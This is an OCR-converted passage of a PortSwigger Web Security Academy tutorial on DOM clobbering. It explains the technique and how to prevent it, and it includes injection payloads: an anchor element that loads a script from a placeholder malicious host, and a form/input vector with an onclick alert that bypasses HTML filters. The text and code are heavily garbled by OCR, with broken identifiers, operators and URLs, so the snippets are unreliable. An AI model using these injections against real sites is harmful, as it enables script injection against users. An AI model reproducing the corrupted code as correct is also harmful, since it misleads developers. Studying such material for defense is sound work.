# DOM clobbering

> Converted source material; attribution: PortSwigger Web Security Academy. Snapshot processed 2026-10-27.
> Source SHA-256: `2558f8f5809ecbc7636960e39df8d749e60db8660208bc7c9d9c85c4e0b3d926`.
> Conversion: Local English OCR, all 3 text segments. Source opinions and historical examples are preserved, not automatically endorsed.
> OCR literals, payloads, and complex table alignment are not character-verified throughout. Use the curated guidance and exact-text sources for implementation; do not execute OCR examples without checking the publisher.


DOM clobbering

DOM-based vulnerabilities clobbering techniques, and suggest ways you can reduce your exposure to DOM clobbering attacks.

## What is DOM clobbering?

DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page. DOM clobbering is particularly useful in cases where XSS is not possible, but you can control some HTML on a page where the attributes id or name are whitelisted by the HTML filter. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL. The term clobbering comes from the fact that you are "clobbering" a global variable or property of an object and overwriting it with a DOM node or HTML collection instead. For example, you can use DOM objects to overwrite other JavaScript objects and exploit unsafe names, such as submit , to interfere with a form's actual submit ( ) function.

## How to exploit DOM-clobbering vulnerabilities

A common pattern used by JavaScript developers is:

```text
var someObJ ect = window . someObj ect I I
```

o;

If you can control some of the HTML on the page, you can clobber the some0bj ect reference with a DOM node, such as an anchor. Consider the following code:

```text
<script>
```

window . onload = function ( ) {

```text
let someObject = window . someObject I I
```

o;

```text
let script = document. createE1ement ( ' script') ;
```

script. src = sorneObj ect . ur I; document . body. appendChiId (script) ,

&lt; / script &gt;

To exploit this vulnerable code, you could inject the following HTML to clobber the someObject reference with an anchor

```text
<a id=someObject name=url href=/ / ma icious—website . corn/ evil.js>
```

As the two anchors use the same 'D, the DOM groups them together in a DOM collection. The DOM clobbering vector then overwrites the someObj ect reference with this DOM collection. A name attribute is used on the last anchor element in order to clobber the url property of the someObj ect object, which points to an external script.

---

Another common technique is to use a form element along with an element such as input to clobber DOM properties For example, clobbering the attributes property enables you to bypass client-side filters that use it in their logic. Although the filter will enumerate the attributes property, it will not actually remove any attributes because the property has been clobbered with a DOM node. As a result, you will be able to inject malicious attributes that would normally be filtered out. For example, consider the following injection: &lt; form onclick=alert (I) ld—attributes &gt;CLick me

In this case, the client-side filter would traverse the DOM and encounter a whitelisted form element. Normally, the filter would loop through the attributes property of the form element and remove any blacklisted attributes. However, because the attributes property has been clobbered with the input element, the filter loops through the input element instead. As the input element has an undefined length, the conditions for the for loop of the filter (for example i<element . attributes . length ) are not met, and the filter simply moves on to the next element instead. This results in the onclick event being ignored altogether by the filter, which subsequently allows the alert ( )

```text
function to be called in the browser.
```

Clobbering DOM attributes to bypass HTML filters

## How to prevent DOM-clobbering attacks

In the simplest terms, you can prevent DOM-clobbering attacks by implementing checks to make sure that objects or functions are what you expect them to be. For instance, you can check that the attributes property of a DOM node is actually an instance of NamedNodeMap . This ensures that the property is an attributes property and not a clobbered HTML element. You should also avoid writing code that references a global variable in conjunction with the logical OR operator , as this can lead to DOM clobbering vulnerabilities. In summary:

- Check that objects and functions are legitimate. If you are filtering the DOM, make sure you check that the object or

```text
function is not a DOM node.
```

- Avoid bad code patterns. Using global variables in conjunction with the logical OR operator should be avoided.

- Use a well-tested library, such as DOMPurify, that accounts for DOM-clobbering vulnerabilities.

---

have a more personalized learning experience? (It's free!)

SIGN UP LOGIN

Find DOM-based vulnerabilities using

TRY FOR FREE
